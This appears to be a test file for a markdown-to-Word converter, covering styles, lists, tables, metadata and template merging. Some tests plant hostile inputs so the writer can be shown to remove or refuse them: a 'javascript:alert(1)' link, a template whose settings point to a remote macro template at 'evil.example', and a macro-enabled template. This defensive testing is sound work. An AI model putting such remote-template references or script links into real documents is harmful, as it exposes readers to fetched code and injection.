import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import { docxToMarkdown } from "../../src/content/docx";
import { docxFeatures, markdownToDocx } from "../../src/content/docx-write";
import { DocumentConversionError } from "../../src/content/errors";
import { parsePart } from "../../src/content/ooxml";
import { attribute, childElements, descendants, firstChild, type XmlElement } from "../../src/content/xml";
import { openZip } from "../../src/content/zip";
import { writeZip } from "../../src/content/zip-write";
import { validateDocx } from "./docx-validate";

const fixture = (name: string) => new Uint8Array(readFileSync(new URL(`../fixtures/${name}`, import.meta.url).pathname));
const TEMPLATE = fixture("python-docx-template.dotx");
const DATE = new Date("2026-03-04T05:06:07.890Z");

async function roundtrip(markdown: string): Promise<string> {
  return (await docxToMarkdown(await markdownToDocx(markdown))).markdown;
}

async function part(bytes: Uint8Array, name: string): Promise<string> {
  return openZip(bytes).readText(name);
}

function styleNamed(styles: XmlElement, name: string): XmlElement | undefined {
  return childElements(styles, "w:style").find(style => attribute(firstChild(style, "w:name"), "w:val")?.toLowerCase() === name.toLowerCase());
}

const SHOWCASE = `# Quarterly Business Review

Revenue grew **18%** year over year, with *strong* demand in ~~two~~ three regions. See \`forecast.xlsx\` and the [plan](https://contoso.sharepoint.com/sites/plan).  
A second line follows a hard break.

## Priorities

1. Expand the partner program
2. Ship the self-service portal
    - Beta in March
    - General availability in May
3. Reduce churn

- [x] Budget approved
- [ ] Hiring plan

> Customers who adopted the portal renewed at a higher rate.

\`\`\`python
def churn(rate):
    return rate * 0.9
\`\`\`

---

| Region | Revenue | Growth |
|:-------|--------:|:------:|
| EMEA | $4.2M | 21% |
| Americas | $6.8M | 15% |
`;

describe("markdownToDocx", () => {
  it("writes a package that passes every structural check", async () => {
    const bytes = await markdownToDocx(SHOWCASE, { author: "Avery Analyst", modifiedAt: DATE });
    const { parts } = await validateDocx(bytes);
    expect([...parts.keys()].toSorted()).toEqual([
      "[Content_Types].xml", "_rels/.rels", "docProps/app.xml", "docProps/core.xml", "word/_rels/document.xml.rels",
      "word/document.xml", "word/fontTable.xml", "word/numbering.xml", "word/settings.xml", "word/styles.xml", "word/theme/theme1.xml",
    ]);
  });

  it("round-trips every construct through the reader", async () => {
    expect(await roundtrip(SHOWCASE)).toBe(`# Quarterly Business Review

Revenue grew **18%** year over year, with *strong* demand in ~~two~~ three regions. See \`forecast.xlsx\` and the [plan](https://contoso.sharepoint.com/sites/plan).
A second line follows a hard break.

## Priorities

1. Expand the partner program
2. Ship the self-service portal
    - Beta in March
    - General availability in May
3. Reduce churn
- [x] Budget approved
- [ ] Hiring plan

> Customers who adopted the portal renewed at a higher rate.

\`\`\`
def churn(rate):
    return rate * 0.9
\`\`\`

---

| Region | Revenue | Growth |
| --- | --- | --- |
| EMEA | $4.2M | 21% |
| Americas | $6.8M | 15% |`);
  });

  it("uses Word's built-in styles by name, in the Office theme's Aptos", async () => {
    const bytes = await markdownToDocx("# A\n\n###### F\n\n> q\n\n`c`\n\n```\nx\n```\n\n| a |\n|---|\n| b |\n\n[l](https://example.com)");
    const styles = parsePart(await part(bytes, "word/styles.xml"));
    for (const [name, id] of [["Normal", "Normal"], ["heading 1", "Heading1"], ["heading 6", "Heading6"], ["Quote", "Quote"], ["HTML Code", "HTMLCode"],
      ["HTML Preformatted", "HTMLPreformatted"], ["Grid Table 4 Accent 1", "GridTable4-Accent1"], ["Hyperlink", "Hyperlink"], ["Normal Table", "TableNormal"]]) {
      expect(attribute(styleNamed(styles, name!), "w:styleId"), name).toBe(id);
    }
    const defaults = firstChild(firstChild(firstChild(styles, "w:docDefaults"), "w:rPrDefault"), "w:rPr");
    expect(attribute(firstChild(defaults, "w:rFonts"), "w:asciiTheme")).toBe("minorHAnsi");
    expect(attribute(firstChild(defaults, "w:sz"), "w:val")).toBe("22");
    expect(await part(bytes, "word/theme/theme1.xml")).toContain('<a:latin typeface="Aptos"');
    expect(attribute(firstChild(firstChild(styleNamed(styles, "heading 1"), "w:pPr"), "w:outlineLvl"), "w:val")).toBe("0");
    expect(await part(bytes, "word/settings.xml")).toContain('w:name="compatibilityMode" w:uri="http://schemas.microsoft.com/office/word" w:val="15"');
  });

  it("defines only the styles a document uses, plus Word's defaults", async () => {
    const styles = parsePart(await part(await markdownToDocx("Just text."), "word/styles.xml"));
    expect(childElements(styles, "w:style").map(style => attribute(style, "w:styleId"))).toEqual(["Normal", "DefaultParagraphFont", "TableNormal", "NoList"]);
    expect(openZip(await markdownToDocx("Just text.")).has("word/numbering.xml")).toBe(false);
  });

  it("restarts each numbered list at its own start", async () => {
    const bytes = await markdownToDocx("1. a\n2. b\n\nBetween.\n\n5. five\n6. six\n\nAgain.\n\n1. one");
    expect((await docxToMarkdown(bytes)).markdown).toBe("1. a\n2. b\n\nBetween.\n\n5. five\n6. six\n\nAgain.\n\n1. one");
    const numbering = parsePart(await part(bytes, "word/numbering.xml"));
    const instances = childElements(numbering, "w:num");
    expect(instances).toHaveLength(3);
    expect(new Set(instances.map(num => attribute(firstChild(num, "w:abstractNumId"), "w:val"))).size).toBe(1);
    expect(instances.map(num => attribute(firstChild(firstChild(num, "w:lvlOverride"), "w:startOverride"), "w:val"))).toEqual(["1", "5", "1"]);
  });

  it("nests lists to Word's nine levels, alternating numbering formats", async () => {
    const markdown = Array.from({ length: 11 }, (_, depth) => `${"    ".repeat(depth)}1. level ${depth}`).join("\n");
    const bytes = await markdownToDocx(markdown);
    const levels = Array.from(descendants(parsePart(await part(bytes, "word/document.xml")), "w:ilvl"), element => attribute(element, "w:val"));
    expect(levels.slice(0, 9)).toEqual(["0", "1", "2", "3", "4", "5", "6", "7", "8"]);
    expect(levels.slice(9).every(level => level === "8")).toBe(true);
    const abstract = childElements(parsePart(await part(bytes, "word/numbering.xml")), "w:abstractNum")[0]!;
    // Eight hex digits, never a negative number: the hash's high bit is set for about half of them.
    expect(attribute(firstChild(abstract, "w:nsid"), "w:val")).toMatch(/^[0-9A-F]{8}$/);
    expect(childElements(abstract, "w:lvl").slice(0, 3).map(level => attribute(firstChild(level, "w:numFmt"), "w:val"))).toEqual(["decimal", "lowerLetter", "lowerRoman"]);
  });

  it("lays tables across the page, with a repeating bold header and column alignment", async () => {
    const bytes = await markdownToDocx("| Item | Notes | Cost |\n|---|:---:|---:|\n| A | a much longer note about the item | 1 |\n| B |");
    const document = parsePart(await part(bytes, "word/document.xml"));
    const table = firstDescendantNamed(document, "w:tbl");
    const width = firstChild(firstChild(table, "w:tblPr"), "w:tblW");
    expect([attribute(width, "w:w"), attribute(width, "w:type")]).toEqual(["5000", "pct"]);
    const grid = childElements(firstChild(table, "w:tblGrid"), "w:gridCol").map(column => Number(attribute(column, "w:w")));
    expect(grid.reduce((sum, value) => sum + value, 0)).toBe(9360);
    expect(grid[1]).toBeGreaterThan(grid[0]!);
    const rows = childElements(table, "w:tr");
    expect(firstChild(firstChild(rows[0], "w:trPr"), "w:tblHeader")).toBeDefined();
    expect(firstChild(firstChild(rows[1], "w:trPr"), "w:tblHeader")).toBeUndefined();
    expect(Array.from(descendants(rows[0]!, "w:r")).every(run => firstChild(firstChild(run, "w:rPr"), "w:b"))).toBe(true);
    const alignments = childElements(rows[1], "w:tc").map(cell => attribute(descendants(cell, "w:jc").next().value, "w:val"));
    expect(alignments).toEqual([undefined, "center", "right"]);
    // A short row is padded, and a table at the end of the body is followed by a paragraph.
    expect(childElements(rows[2], "w:tc")).toHaveLength(3);
    expect(childElements(firstChild(document, "w:body")).map(element => element.name)).toEqual(["w:tbl", "w:p", "w:sectPr"]);
  });

  it("keeps adjacent tables apart, as Word would merge them", async () => {
    const bytes = await markdownToDocx("| a |\n|---|\n| 1 |\n\n| b |\n|---|\n| 2 |");
    await validateDocx(bytes);
    expect((await docxToMarkdown(bytes)).markdown).toBe("| a |\n| --- |\n| 1 |\n\n| b |\n| --- |\n| 2 |");
  });

  it("drops characters XML can't carry and escapes markup", async () => {
    const bytes = await markdownToDocx("Bell\u0007 and ￾ <tag> & \"quotes\" \uD800 end");
    await validateDocx(bytes);
    expect((await docxToMarkdown(bytes)).markdown).toBe("Bell and  \\<tag> & \"quotes\"  end");
  });

  it("records a leading heading as the title, and the author", async () => {
    const core = await part(await markdownToDocx("# Launch Plan\n\nBody", { author: "Avery", modifiedAt: DATE }), "docProps/core.xml");
    expect(core).toContain("<dc:title>Launch Plan</dc:title>");
    expect(core).toContain("<dc:creator>Avery</dc:creator>");
    expect(core).toContain('<dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-04T05:06:07Z</dcterms:modified>');
    expect(await part(await markdownToDocx("# Launch Plan", { title: "Explicit & Co" }), "docProps/core.xml")).toContain("<dc:title>Explicit &amp; Co</dc:title>");
    expect(await part(await markdownToDocx("## Not a title"), "docProps/core.xml")).not.toContain("dc:title");
  });

  it("writes an empty document Word will open", async () => {
    const bytes = await markdownToDocx("");
    await validateDocx(bytes);
    expect(childElements(firstChild(parsePart(await part(bytes, "word/document.xml")), "w:body")).map(element => element.name)).toEqual(["w:p", "w:sectPr"]);
  });

  it("links only to web and mail addresses, reusing one relationship per target", async () => {
    const bytes = await markdownToDocx("[a](https://x.example/) [b](https://x.example/) [c](javascript:alert(1)) <mailto:someone@example.com>");
    const rels = await part(bytes, "word/_rels/document.xml.rels");
    expect(rels.match(/TargetMode="External"/g)).toHaveLength(2);
    expect(rels).not.toContain("javascript");
  });

  it("reports nothing lost for a document it wrote", async () => {
    expect(await docxFeatures(await markdownToDocx(SHOWCASE))).toEqual([]);
  });
});

describe("markdownToDocx with a template", () => {
  it("takes the template's styles, theme, settings, header, footer and margins, replacing its body", async () => {
    const bytes = await markdownToDocx(SHOWCASE, { template: TEMPLATE, author: "Avery", modifiedAt: DATE });
    await validateDocx(bytes);
    const source = openZip(TEMPLATE);
    const written = openZip(bytes);
    for (const name of ["word/theme/theme1.xml", "word/settings.xml", "word/fontTable.xml", "word/header1.xml", "word/footer1.xml"]) {
      const original = source.entries().find(entry => entry.name.toLowerCase() === name.toLowerCase());
      if (!original) continue;
      expect(await written.readBytes(name), name).toEqual(await source.readBytes(name));
    }
    const types = await written.readText("[Content_Types].xml");
    expect(types).toContain("wordprocessingml.document.main+xml");
    expect(types).not.toContain("wordprocessingml.template.main+xml");
    const document = await written.readText("word/document.xml");
    expect(document).not.toContain("Template placeholder");
    const templateDocument = await source.readText("word/document.xml");
    const section = (text: string) => text.slice(text.lastIndexOf("<w:sectPr"), text.lastIndexOf("</w:body>"));
    expect(section(document)).toBe(section(templateDocument));
    expect(section(document)).toContain("w:headerReference");
    // The template's text width (1.25" margins), not Letter's default.
    const grid = Array.from(document.matchAll(/<w:gridCol w:w="(\d+)"/g), match => Number(match[1]));
    expect(grid.reduce((sum, value) => sum + value, 0)).toBe(12240 - 2 * 1800);
    expect((await docxToMarkdown(bytes)).markdown).toBe(await roundtrip(SHOWCASE));
  });

  it("keeps the template's own definitions of the styles it has, adding only those it lacks", async () => {
    const bytes = await markdownToDocx(SHOWCASE, { template: TEMPLATE });
    const before = parsePart(await openZip(TEMPLATE).readText("word/styles.xml"));
    const after = parsePart(await part(bytes, "word/styles.xml"));
    const originalStyles = await openZip(TEMPLATE).readText("word/styles.xml");
    const writtenStyles = await part(bytes, "word/styles.xml");
    // The template's part is kept as written, with definitions appended.
    expect(writtenStyles.startsWith(originalStyles.slice(0, originalStyles.lastIndexOf("</w:styles>")))).toBe(true);
    expect(styleNamed(after, "heading 1")).toEqual(styleNamed(before, "heading 1"));
    expect(/<w:style [^>]*w:styleId="Heading1"[^>]*>(?:(?!<\/w:style>)[\s\S])*8B0000/.test(writtenStyles)).toBe(true);
    expect(childElements(after, "w:style").filter(style => attribute(firstChild(style, "w:name"), "w:val") === "heading 1")).toHaveLength(1);
    for (const name of ["HTML Preformatted", "HTML Code", "Grid Table 4 Accent 1"]) expect(styleNamed(after, name), name).toBeDefined();
    const added = childElements(after, "w:style").length - childElements(before, "w:style").length;
    expect(added).toBeGreaterThan(0);
  });

  it("lays lists out in the template's own List Bullet and List Number styles", async () => {
    const bytes = await markdownToDocx("- a\n    - nested\n\n1. c\n\nBetween.\n\n4. d", { template: TEMPLATE });
    await validateDocx(bytes);
    const document = await part(bytes, "word/document.xml");
    expect(document.match(/<w:pStyle w:val="ListBullet"\/>/g)).toHaveLength(1);
    expect(document.match(/<w:pStyle w:val="ListBullet2"\/>/g)).toHaveLength(1);
    expect(document.match(/<w:pStyle w:val="ListNumber"\/>/g)).toHaveLength(2);
    // Each numbered list restarts the style's own definition rather than continuing the last.
    const before = parsePart(await openZip(TEMPLATE).readText("word/numbering.xml"));
    const numbering = parsePart(await part(bytes, "word/numbering.xml"));
    expect(childElements(numbering, "w:abstractNum")).toHaveLength(childElements(before, "w:abstractNum").length);
    expect(childElements(numbering, "w:num")).toHaveLength(childElements(before, "w:num").length + 2);
    expect((await docxToMarkdown(bytes)).markdown).toBe("- a\n    - nested\n1. c\n\nBetween.\n\n4. d");
  });

  it("adds list definitions beside the template's own without reusing their ids", async () => {
    // Task lists, and lists nested deeper than the template's List Bullet 5, use the writer's own.
    const markdown = "- [ ] a\n- [x] b\n\n" + Array.from({ length: 7 }, (_, depth) => `${"    ".repeat(depth)}1. level ${depth}`).join("\n");
    const bytes = await markdownToDocx(markdown, { template: TEMPLATE });
    const { numbering } = await validateDocx(bytes);
    const before = parsePart(await openZip(TEMPLATE).readText("word/numbering.xml"));
    expect(childElements(numbering, "w:abstractNum").length).toBe(childElements(before, "w:abstractNum").length + 2);
    expect(childElements(numbering, "w:num").length).toBeGreaterThan(childElements(before, "w:num").length + 2);
    const nsids = childElements(numbering, "w:abstractNum").map(abstract => attribute(firstChild(abstract, "w:nsid"), "w:val"));
    expect(new Set(nsids).size).toBe(nsids.length);
    expect((await docxToMarkdown(bytes)).markdown).toMatch(/^- \[ \] a\n- \[x\] b\n1\. level 0\n {4}1\. level 1/);
  });

  it("gives a styled document's look to a document used as a template", async () => {
    const report = fixture("python-docx-report.docx");
    const bytes = await markdownToDocx("# New\n\nText", { template: report });
    await validateDocx(bytes);
    expect((await docxToMarkdown(bytes)).markdown).toBe("# New\n\nText");
    // The source document's comments part stays (it is referenced by nothing), but none of its body.
    expect(await part(bytes, "word/document.xml")).not.toContain("Project Falcon");
  });

  it("drops the template's comments, notes and attached template along with its body", async () => {
    const W = "http://schemas.openxmlformats.org/wordprocessingml/2006/main";
    const R = "http://schemas.openxmlformats.org/officeDocument/2006/relationships";
    const CT = "http://schemas.openxmlformats.org/package/2006/content-types";
    const PR = "http://schemas.openxmlformats.org/package/2006/relationships";
    const rel = (id: string, type: string, target: string, external = false) =>
      `<Relationship Id="${id}" Type="${R}/${type}" Target="${target}"${external ? ' TargetMode="External"' : ""}/>`;
    const template = await writeZip([
      { name: "[Content_Types].xml", data: `<Types xmlns="${CT}"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/>` +
        '<Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>' +
        '<Override PartName="/word/comments.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.comments+xml"/>' +
        '<Override PartName="/word/footnotes.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.footnotes+xml"/>' +
        '<Override PartName="/word/settings.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/></Types>' },
      { name: "_rels/.rels", data: `<Relationships xmlns="${PR}">${rel("rId1", "officeDocument", "word/document.xml")}</Relationships>` },
      { name: "word/document.xml", data: `<w:document xmlns:w="${W}"><w:body><w:p><w:r><w:t>Old</w:t></w:r></w:p><w:sectPr/></w:body></w:document>` },
      { name: "word/_rels/document.xml.rels", data: `<Relationships xmlns="${PR}">${rel("rId1", "comments", "comments.xml")}${rel("rId2", "footnotes", "footnotes.xml")}${rel("rId3", "settings", "settings.xml")}</Relationships>` },
      { name: "word/comments.xml", data: `<w:comments xmlns:w="${W}"><w:comment w:id="0"><w:p><w:r><w:t>Confidential remark</w:t></w:r></w:p></w:comment></w:comments>` },
      { name: "word/footnotes.xml", data: `<w:footnotes xmlns:w="${W}"><w:footnote w:type="separator" w:id="-1"><w:p><w:r><w:separator/></w:r></w:p></w:footnote>` +
        '<w:footnote w:type="continuationSeparator" w:id="0"><w:p><w:r><w:continuationSeparator/></w:r></w:p></w:footnote>' +
        '<w:footnote w:id="1"><w:p><w:r><w:t>Secret source</w:t></w:r></w:p></w:footnote></w:footnotes>' },
      { name: "word/settings.xml", data: `<w:settings xmlns:w="${W}" xmlns:r="${R}"><w:zoom w:percent="100"/><w:attachedTemplate r:id="rId1"/><w:footnotePr><w:footnote w:id="-1"/><w:footnote w:id="0"/></w:footnotePr></w:settings>` },
      { name: "word/_rels/settings.xml.rels", data: `<Relationships xmlns="${PR}">${rel("rId1", "attachedTemplate", "https://evil.example/t.dotm", true)}</Relationships>` },
    ]);
    const bytes = await markdownToDocx("# New", { template });
    const zip = openZip(bytes);
    expect(zip.has("word/comments.xml")).toBe(false);
    expect(await part(bytes, "[Content_Types].xml")).not.toContain("comments.xml");
    expect(await part(bytes, "word/_rels/document.xml.rels")).not.toContain("comments");
    const footnotes = await part(bytes, "word/footnotes.xml");
    expect(footnotes).toContain('w:type="continuationSeparator" w:id="0"');
    expect(footnotes).not.toContain("Secret source");
    const settings = await part(bytes, "word/settings.xml");
    expect(settings).toContain('<w:zoom w:percent="100"/><w:footnotePr>');
    expect(settings).not.toContain("attachedTemplate");
    expect(await part(bytes, "word/_rels/settings.xml.rels")).not.toContain("attachedTemplate");
    expect(await part(bytes, "word/document.xml")).toContain("New");
  });

  it("refuses a macro-enabled template", async () => {
    const zip = openZip(TEMPLATE);
    const entries = await Promise.all(zip.entries().map(async entry => ({
      name: entry.name,
      data: entry.name === "[Content_Types].xml"
        ? (await zip.readText(entry.name)).replace("application/vnd.openxmlformats-officedocument.wordprocessingml.template.main+xml", "application/vnd.ms-word.template.macroEnabledTemplate.main+xml")
        : await zip.readBytes(entry.name),
    })));
    const macro = await writeZip(entries);
    await expect(markdownToDocx("x", { template: macro })).rejects.toThrow(/macro-enabled/);
    await expect(markdownToDocx("x", { template: macro })).rejects.toBeInstanceOf(DocumentConversionError);
  });

  it("refuses a template in Strict Open XML rather than guessing at it", async () => {
    const zip = openZip(TEMPLATE);
    const entries = await Promise.all(zip.entries().map(async entry => ({
      name: entry.name,
      data: entry.name === "word/document.xml"
        ? (await zip.readText(entry.name)).replace(/schemas\.openxmlformats\.org\/wordprocessingml\/2006\/main/g, "purl.oclc.org/ooxml/wordprocessingml/main")
        : await zip.readBytes(entry.name),
    })));
    await expect(markdownToDocx("x", { template: await writeZip(entries) })).rejects.toThrow(/Transitional/);
  });

  it("copies the body's whole section properties when a tracked layout change nests earlier ones", async () => {
    const zip = openZip(TEMPLATE);
    const change = '<w:sectPrChange w:id="9" w:author="Avery" w:date="2026-01-01T00:00:00Z"><w:sectPr><w:pgSz w:w="11906" w:h="16838"/></w:sectPr></w:sectPrChange>';
    const entries = await Promise.all(zip.entries().map(async entry => ({
      name: entry.name,
      data: entry.name === "word/document.xml"
        ? (await zip.readText(entry.name)).replace(/<\/w:sectPr>(?=\s*<\/w:body>)/, `${change}</w:sectPr>`)
        : await zip.readBytes(entry.name),
    })));
    const bytes = await markdownToDocx("New body", { template: await writeZip(entries) });
    const document = await part(bytes, "word/document.xml");
    const body = firstChild(parsePart(document), "w:body")!;
    const last = childElements(body).at(-1)!;
    expect(last.name).toBe("w:sectPr");
    expect(firstChild(last, "w:sectPrChange")).toBeDefined();
    expect(document.match(/<w:sectPr[\s>]/g)).toHaveLength(2);
    expect(document.match(/<\/w:sectPrChange>/g)).toHaveLength(1);
  });
});

function firstDescendantNamed(root: XmlElement, name: string): XmlElement {
  const found = descendants(root, name).next().value;
  if (!found) throw new Error(`no ${name}`);
  return found;
}

